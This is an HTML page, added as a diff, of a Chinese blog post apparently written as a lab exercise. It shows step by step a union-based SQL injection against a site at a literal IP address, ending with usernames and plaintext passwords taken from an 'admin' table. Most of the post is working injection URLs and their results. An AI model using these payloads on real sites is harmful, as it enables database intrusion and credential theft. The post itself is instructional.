@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>sql注入得到数据库的用户名和密码 | Hexo</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="sql注入," />
+  
+
+  <meta name="description" content="确定注入点 当输入http:&#x2F;&#x2F;59.63.200.79:8003&#x2F;?id&#x3D;1%20and%201&#x3D;1时网站显示正常 当输入http:&#x2F;&#x2F;59.63.200.79:8003&#x2F;?id&#x3D;1%20and%201&#x3D;2时网站显示不正常，判断注入点在此。  确定网站的回传的字段数 输入http:&#x2F;&#x2F;59.63.200.79:8003&#x2F;?id&#x3D;1%20and%201&#x3D;1%20order%20by%201网站显示">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入得到数据库的用户名和密码">
+<meta property="og:url" content="https://weizhaome.github.io/2021/03/08/sql%E6%B3%A8%E5%85%A5%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="确定注入点 当输入http:&#x2F;&#x2F;59.63.200.79:8003&#x2F;?id&#x3D;1%20and%201&#x3D;1时网站显示正常 当输入http:&#x2F;&#x2F;59.63.200.79:8003&#x2F;?id&#x3D;1%20and%201&#x3D;2时网站显示不正常，判断注入点在此。  确定网站的回传的字段数 输入http:&#x2F;&#x2F;59.63.200.79:8003&#x2F;?id&#x3D;1%20and%201&#x3D;1%20order%20by%201网站显示">
+<meta property="og:locale">
+<meta property="article:published_time" content="2021-03-08T14:15:00.000Z">
+<meta property="article:modified_time" content="2021-03-14T13:25:51.537Z">
+<meta property="article:author" content="weizhao">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+
+  
+
+  
+    <link rel="icon" href="/favicon.ico">
+  
+
+  <link href="/css/styles.css?v=c114cben" rel="stylesheet">
+
+
+  
+    
+<link rel="stylesheet" href="/css/personal-style.css">
+
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-text">确定注入点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E7%BD%91%E7%AB%99%E7%9A%84%E5%9B%9E%E4%BC%A0%E7%9A%84%E5%AD%97%E6%AE%B5%E6%95%B0"><span class="toc-text">确定网站的回传的字段数</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%9B%9E%E6%98%BE%E7%82%B9"><span class="toc-text">确定回显点</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E5%90%8D%E7%A7%B0"><span class="toc-text">确定数据库名称</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8C%85%E5%90%AB%E7%9A%84%E8%A1%A8"><span class="toc-text">确定当前数据库包含的表</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%BD%93%E5%89%8D%E6%95%B0%E6%8D%AE%E5%BA%93%E8%A1%A8%E5%8C%85%E5%90%AB%E7%9A%84%E5%88%97%E5%90%8D"><span class="toc-text">确定当前数据库表包含的列名</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%BD%93%E5%89%8D%E8%A1%A8%E8%AE%B0%E5%BD%95%E7%9A%84%E7%94%A8%E6%88%B7"><span class="toc-text">确定当前表记录的用户</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81"><span class="toc-text">确定用户的密码</span></a></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-sql注入解题思路" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">sql注入得到数据库的用户名和密码</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2021.03.08</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>weizhao</span>
+        </span>
+      
+
+      
+
+
+      
+        <span>
+          <i class="icon-comment"></i>
+          <a href="https://weizhaome.github.io/2021/03/08/sql%E6%B3%A8%E5%85%A5%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/#disqus_thread"></a>
+        </span>
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h1 id="确定注入点"><a href="#确定注入点" class="headerlink" title="确定注入点"></a>确定注入点</h1><ul>
+<li>当输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=1">http://59.63.200.79:8003/?id=1%20and%201=1</a><br>时网站显示正常</li>
+<li>当输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2">http://59.63.200.79:8003/?id=1%20and%201=2</a><br>时网站显示不正常，判断注入点在此。</li>
+</ul>
+<h1 id="确定网站的回传的字段数"><a href="#确定网站的回传的字段数" class="headerlink" title="确定网站的回传的字段数"></a>确定网站的回传的字段数</h1><ul>
+<li>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=1%20order%20by%201">http://59.63.200.79:8003/?id=1%20and%201=1%20order%20by%201</a><br>网站显示正常，结尾用order by 2 时仍显示正常，当使用order by 3 时页面显示不正常，判断网站包含两个字段。</li>
+</ul>
+<h1 id="确定回显点"><a href="#确定回显点" class="headerlink" title="确定回显点"></a>确定回显点</h1><ul>
+<li>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,2">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,2</a><br>时页面显示出来2，确定了回显地点。</li>
+</ul>
+<h1 id="确定数据库名称"><a href="#确定数据库名称" class="headerlink" title="确定数据库名称"></a>确定数据库名称</h1><ul>
+<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,database()">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,database()</a><br>出现当前数据库的名称：maoshe</p>
+<h1 id="确定当前数据库包含的表"><a href="#确定当前数据库包含的表" class="headerlink" title="确定当前数据库包含的表"></a>确定当前数据库包含的表</h1></li>
+<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%200,1</a><br>返回当前数据库包含的第一个表名：admin。</p>
+</li>
+<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,table_name%20from%20information_schema.tables%20where%20table_schema=database()%20limit%201,1</a><br>页面异常，表示当前数据库只包含一个表。</p>
+</li>
+</ul>
+<p><strong><em>limit用法</em></strong></p>
+<ul>
+<li><p>LIMIT后的第一个参数是输出记录的初始位置，第二个参数偏移量，偏移多少，输出的条目就是多少。</p>
+<h1 id="确定当前数据库表包含的列名"><a href="#确定当前数据库表包含的列名" class="headerlink" title="确定当前数据库表包含的列名"></a>确定当前数据库表包含的列名</h1></li>
+<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%200,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%200,1</a><br>得到第一列的名称为：Id</p>
+</li>
+<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%25">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%</a><br>20and%20table_name=%27admin%27%20limit%201,1<br>得到第二列的名称为：username </p>
+</li>
+<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%202,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,column_name%20from%20information_schema.columns%20where%20table_schema=database()%20and%20table_name=%27admin%27%20limit%202,1</a><br>得到第三列的名称为：password </p>
+</li>
+<li><p>输入limit 3,1时页面异常，说明admin表只包含三列。</p>
+<h1 id="确定当前表记录的用户"><a href="#确定当前表记录的用户" class="headerlink" title="确定当前表记录的用户"></a>确定当前表记录的用户</h1></li>
+<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20from%20admin%20limit%200,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20from%20admin%20limit%200,1</a><br>得到第一个用户为admin</p>
+</li>
+<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%201,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%201,1</a><br>得到第二个用户为：ppt领取微信 。</p>
+</li>
+<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%202,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,username%20%20from%20admin%20limit%202,1</a><br>页面异常，说明只包含两个用户。</p>
+<h1 id="确定用户的密码"><a href="#确定用户的密码" class="headerlink" title="确定用户的密码"></a>确定用户的密码</h1></li>
+<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20from%20admin%20limit%200,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20from%20admin%20limit%200,1</a><br>得到admin用户的密码为：hellohack </p>
+</li>
+<li><p>输入<br><a target="_blank" rel="noopener" href="http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20%20from%20admin%20limit%201,1">http://59.63.200.79:8003/?id=1%20and%201=2%20union%20select%201,password%20%20from%20admin%20limit%201,1</a><br>得到第二个用户的密码为：zkaqbanban </p>
+</li>
+</ul>
+
+    
+  </div>
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持forsigner</div>
+        <ul>
+        
+          <li class="item">
+            
+              <span>支付宝扫一扫</span>
+            
+            <img src="/images/qr-alipay.png" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2019/11/24/linux%E6%8C%82%E8%BD%BDU%E7%9B%98%E5%A4%B1%E8%B4%A5/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="show pull-right" href="/2021/03/14/%E5%AD%97%E7%AC%A6%E5%9E%8Bsql%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+
+   
+      <div class="git"></div>
+   
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+  <section class="disqus-comments">
+    <div id="disqus_thread">
+      <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+  </section>
+
+  <script>
+    var disqus_shortname = 'forsigner';
+    
+    var disqus_url = 'https://weizhaome.github.io/2021/03/08/sql%E6%B3%A8%E5%85%A5%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/';
+    
+    (function(){
+      var dsq = document.createElement('script');
+      dsq.type = 'text/javascript';
+      dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+
+  <script id="dsq-count-scr" src="//forsigner.disqus.com/count.js" async></script>
+
+
+
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
